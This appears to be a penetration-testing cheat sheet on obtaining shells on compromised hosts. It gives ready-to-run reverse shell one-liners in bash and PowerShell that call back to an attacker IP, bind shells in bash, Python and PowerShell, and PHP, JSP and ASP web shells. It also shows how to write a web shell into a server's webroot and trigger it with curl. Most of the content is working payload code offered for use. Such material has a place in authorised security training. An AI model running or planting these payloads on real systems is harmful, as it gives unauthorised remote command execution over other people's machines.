# Shells
When we want to take control of a compromised host, we will create a shell connection with it.

This can take one of three forms:
 - `Reverse Shell`
 - `Bind Shell`
 - `Web Shell`

## Upgrade Shell
After establishing a shell, we will be missing a couple of features. For example, we can't move the cursor left or right to edit a command or up and down for previous commands. Running this command will map our terminal TTY with the remote TTY:
```
$ python -c 'import pty; pty.spawn("/bin/bash")'
```
After inputing this command, we will hit `[CTRL] + z` to background our shell and get back on the local terminal, where we will run the following pair of commands:
```
$ stty raw -echo
$ fg
```
Then we might have the issue that our shell isn't taking up the full space of the terminal. To fix this, we can full-size another local terminal and get a couple of variables with teh following commands:
```
$ echo $TERM
$ stty size
```
Then we can return to the remote shell and correct the values there:
```
$ export TERM=xterm-256color
$ stty rows 67 columns 318
```
Now, after all of those steps, our netcat shell should be mimicing all the features of an SSH connection.

## Reverse Shell
We will need a reverse shell payload for the compromised system. A comprehensive list is [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md), but first, we create a netcat listener on our VM:
```
$ nc -lvnp 1234
    -l = listening
    -v = verbose
    -n = faster connection
    -p = port 1234
```
### Bash
```
$ bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```
or 
```
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```
### Powershell
```
$ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

## Bind Shell
Unlike the reverse shell where the compromised host connects to us, we connect to the host with this shell. Again, there is a comprehensive list [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md). After we have used one of the following, we will connect to the corresponding IP and port with `netcat`.
### Bash
```
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```
### Python
```
$ python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```
### Powershell
```
$ powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

## Web Shell
The final type of shell is a web shell. This is typically a web script like `PHP` or `ASPX` that accepts our command through HTTP request parameters, executes our command, and prints it's output back on the web page.

First, we need to write our web shell that  will take our command through a GET request, execute it, and print it's output back. A web shell script is typically a one-liner that is very short and can be easily memorized:
### PHP
```
<?php system($_REQUEST["cmd"]); ?>
```
### JSP
```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
### ASP
```
<% eval request("cmd") %>
```

Then, we need to upload one of these web shells to the remote host's web directory to execute the script through the web browser. The default webroot varies by the webserver being used:
<center>

**Web Server** | **Default Webroot**
--- | ---
`Apache` | /var/www/html/
`Nginx` | /usr/local/nginx/html/
`IIS` | c:\inetpub\wwwroot\
`XAMPP` | C:\xampp\htdocs\
</center>
We can check these directories to see which one is in use, then use `echo` to write our web shell into the appropriate one. For example:
```
$ echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

Once we have written our web shell, we can access it through a browser or by using `cURL`. We can visit the shell.php page on the compromised website, and use `?cmd=id` to execute the `id` command. Or, through `cURL`:
```
$ curl http://[IP ADDRESS]:[PORT]/shell.php?cmd=id
```